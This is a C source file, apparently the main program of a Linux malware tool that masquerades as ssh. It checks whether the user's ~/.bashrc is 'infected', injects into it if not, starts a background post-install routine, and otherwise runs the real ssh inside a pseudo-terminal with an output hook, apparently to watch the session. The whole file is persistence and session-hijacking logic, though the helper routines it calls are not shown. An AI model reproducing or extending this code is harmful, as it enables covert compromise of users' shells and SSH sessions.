#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include <termios.h>
#include <sys/wait.h>

#include "tas/tas.h"
#include "tas/constructor.c"

#include "output-hooks.h"
#include "post-install.h"
#include "install.h"
#include "utils.h"
#include "debug.h"

int exec_ssh(int argc, char **argv)
{
	(void) argc;
	struct termios tios;

	tas_tty tty = TAS_TTY_INIT;
	int status;

	if (argv) argv[0] = "ssh";

	pid_t pid = tas_forkpty(&tty);
	if (pid <= 0) {
		debug("execvp(\"ssh\", argv)");
		status = execvp("ssh", argv);
		goto end;
	}

	tas_raw_mode(&tios, STDIN_FILENO);
	tty.output_hook = wait_last_login;

	tas_tty_loop(&tty);

	tcsetattr(STDIN_FILENO, TCSAFLUSH, &tios);
	waitpid(pid, &status, 0);

	end:
	return status;
}


int main(int argc, char **argv)
{
	char bashrc[1024];

	if (!current_exe) {
		debug("current_exe is empty, /proc is mounted?");
		debug("executing ssh");
		return execvp("ssh", argv);
	}

	snprintf(bashrc, sizeof(bashrc), "%s/.bashrc", gethome());
	debug("bashrc -> %s", bashrc);

	switch (check_bashrc(bashrc)) {
		case BASHRC_INFECTED:
			debug("bashrc already infected");
			return exec_ssh(argc, argv);

		case BASHRC_NOT_INFECTED:
			debug(".bashrc not infected");
			debug("trying infect .bashrc");
			if (infect_bashrc(bashrc)) {
				debug("failed to infect .bashrc");
			} else {
				debug(".bashrc infection done!");
			}
		break;

		case BASHRC_NOT_EXISTS:
			debug("bashrc not found...");
	}

	debug("starting post-install in background");
	post_install();

	return 0;
}
